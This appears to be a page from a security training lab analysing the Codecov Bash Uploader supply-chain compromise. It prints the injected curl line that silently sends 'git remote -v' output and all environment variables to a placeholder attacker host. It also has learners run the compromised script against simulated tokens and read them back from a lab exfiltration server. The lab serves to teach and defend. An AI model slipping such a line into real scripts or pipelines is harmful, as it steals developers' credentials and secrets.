# Lab 6.7: Case Study: Codecov Bash Uploader

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Analyze</span>
  <span class="phase-arrow">›</span>
  <a href="../lessons/" class="phase-step upcoming">Lessons</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## The Modified Uploader Script

**Goal:** Walk through the exfiltration mechanism.

### Compare legitimate vs. compromised scripts

```bash
diff /app/uploader/legitimate-uploader.sh /app/uploader/compromised-uploader.sh
```

The attacker added one line:

```bash
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
    http://<attacker-server>/upload/v2 || true
```

Silent mode, 0.5s timeout, sends all env vars, `|| true` suppresses errors.

### See the exfiltration

```bash
export GITHUB_TOKEN="ghp_SIMULATED_TOKEN_12345"
export AWS_ACCESS_KEY_ID="AKIA_SIMULATED_KEY"
export AWS_SECRET_ACCESS_KEY="SIMULATED_SECRET_KEY_XXXXX"
export NPM_TOKEN="npm_SIMULATED_TOKEN_67890"

bash /app/uploader/compromised-uploader.sh
curl -s http://exfil-server:8080/collected | python3 -m json.tool
```

Every environment variable exfiltrated. The pipeline showed "Coverage uploaded successfully."

### How the attacker gained access

```bash
cat /app/analysis/access-vector.txt
```

A credential leaked from Codecov's Docker image creation process allowed the attacker to modify the script on their CDN. Modifying it affected all users immediately.

> **Checkpoint:** You should see the exfiltrated environment variables on the exfil server. Run `curl -s http://exfil-server:8080/collected | python3 -m json.tool` to confirm.
